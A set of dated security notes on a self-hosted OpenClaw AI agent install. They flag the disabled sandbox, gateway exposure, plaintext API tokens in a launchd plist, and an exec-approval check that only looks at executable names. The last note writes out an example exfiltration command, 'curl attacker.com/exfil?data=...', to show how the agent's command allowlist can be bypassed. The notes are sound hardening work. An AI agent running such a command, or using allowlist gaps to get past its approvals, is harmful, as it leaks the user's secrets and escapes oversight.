# OpenClaw Security Notes

### 2026-02-11 - Security Research Summary
[research] OpenClaw v2026.2.9 is current (latest). Major security crisis in Jan 2026: 21,639 exposed instances found via Censys/Shodan. CVE-2026-25253 (RCE). Primary failures: unauthenticated gateways (62%), localhost spoofing (28%), root containers (10%).

### 2026-02-11 - Sandbox Config Exists But Not Enabled
[gotcha] OpenClaw has built-in tool-level sandboxing via `agents.defaults.sandbox` in openclaw.json. Ashley's install does NOT have this configured. This is the #1 security gap -- more important than gateway location.

### 2026-02-11 - Sandbox Configuration
[config] Add to ~/.openclaw/openclaw.json:
```json
"agents": {
  "defaults": {
    "sandbox": {
      "mode": "non-main",
      "scope": "agent",
      "workspace": "read-only"
    }
  }
}
```

### 2026-02-11 - Local Gateway Best Practice
[pattern] If running gateway locally: bind to 127.0.0.1 ONLY, use Tailscale Serve for remote access. Never expose on 0.0.0.0 even with auth. Test with `gateway.mode: "local"` before decommissioning Railway.

### 2026-02-11 - Launchd Plist Has Plaintext Secrets
[gotcha] ~/Library/LaunchAgents/ai.openclaw.node.plist contains RUBE_TOKEN, SUPABASE_SERVICE_KEY, ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN in plaintext EnvironmentVariables. Any process running as ashleytower can read them.

### 2026-02-11 - Exec Approvals Gap
[gotcha] exec-approvals.json only checks executable PATH, not arguments. `git` is allowed so `git push --force` works. `curl` is allowed so `curl attacker.com/exfil?data=...` works. Need argument-level filtering.
